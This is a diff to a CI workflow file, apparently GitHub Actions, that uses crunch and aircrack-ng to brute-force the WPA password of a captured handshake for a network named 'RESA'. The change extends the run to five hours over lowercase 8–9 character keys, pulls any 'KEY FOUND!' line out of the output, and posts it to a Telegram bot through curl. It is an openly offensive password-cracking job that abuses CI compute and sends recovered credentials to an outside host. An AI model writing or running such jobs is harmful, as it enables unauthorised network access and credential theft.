@@ -155,11 +155,16 @@ jobs:
           cat .count
           ls -la
 
-          crunch 8 8 1234567890 --stdout | timeout -s INT -k 10s 10s \
-            ./install/bin/aircrack-ng -w- mydata/resa.cap -e RESA || true
+          crunch 8 9 abcdefghijklmnopqrstuvwxyz --stdout | timeout -s INT -k 2m 5h \
+            ./install/bin/aircrack-ng -w- mydata/resa.cap -e RESA | tee aircrack_output.log || true
+
+          if grep -q "KEY FOUND!" aircrack_output.log; then
+            FOUND_KEY=$(grep "KEY FOUND!" aircrack_output.log)
+            MSG=" 🎉 $FOUND_KEY"
+          fi
 
           RES=$(cat .count || echo 0)
-          MSG="[$RUN_ID] Done current: $RES"
+          MSG="[$RUN_ID] Done current: $RES $MSG"
           curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
             -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null || true
 
@@ -173,6 +178,7 @@ jobs:
         run: |
           mkdir -p output
 
+          cp aircrack_output.log output
           cp .count output/count.txt
 
 
